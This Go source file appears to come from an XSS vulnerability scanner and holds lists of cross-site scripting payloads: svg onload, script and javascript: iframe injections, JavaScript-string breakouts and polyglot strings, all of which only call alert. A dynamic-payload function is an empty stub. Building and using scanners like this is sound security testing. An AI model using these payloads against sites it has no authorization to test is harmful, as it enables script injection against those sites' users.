package core

func getCommonPayload() []string {
	payload := []string{
		"\"><SvG/onload=alert(45)>",
		"\"><SvG/onload=alert(45) id=dalfox>",
		"\"><SvG/onload=alert(45) class=dlafox>",
		"'><sVg/onload=alert(45)>",
		"'><sVg/onload=alert(45) id=dalfox>",
		"'><sVg/onload=alert(45) class=dalfox>",
		"</ScriPt><sCripT>alert(45)</sCriPt>",
		"</ScriPt><sCripT id=dalfox>alert(45)</sCriPt>",
		"</ScriPt><sCripT class=dalfox>alert(45)</sCriPt>",
		"\"><iFrAme/src=jaVascRipt:alert(45)></iFramE>",
		"\"><iFrAme/src=jaVascRipt:alert(45) id=dalfox></iFramE>",
		"\"><iFrAme/src=jaVascRipt:alert(45) class=dalfox></iFramE>",
		"'><iFrAme/src=jaVascRipt:alert(45)></iFramE>",
		"'><iFrAme/src=jaVascRipt:alert(45) id=dalfox></iFramE>",
		"'><iFrAme/src=jaVascRipt:alert(45) class=dalfox></iFramE>",
		"\">asd",
		"'>asd",
	}
	return payload
}

func getInJsPayload() []string {
	payload := []string{
		"'+alert(45)+'",
		"\"+alert(45)+\"",
		"'-confirm`45`-'",
		"\"-confirm`45`-\"",
		"</script><svg/onload=alert(45)>",
		"</script><script>alert(45)</script>",
	}
	return payload
}

func getForceVerifyPayload() []string {
	payload := []string{
		"jaVasCript:/*-/*`/*\\`/*\\'/*\"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\\'\"><svg/onload=alert(45)>",
		"javascript:\"/*`/*\\\"/*\\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\\'\"><svg/onload=alert(45)>",
		"javascript:\"/*\\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\\'\"><svg/onload=alert(45)>",
		"<xmp><p title=\"</xmp><svg/onload=alert(45)>",
		"\"\\'><svg/whatthe=\"\"onload=alert(45)>",
	}
	return payload
}

func makeDynamicPayload(badchars, rtype string) []string {
	payload := []string{}
	if rtype == "inHTML" {
		for _, _ = range badchars {

		}
	} else {
		// inJS

	}
	return payload
}
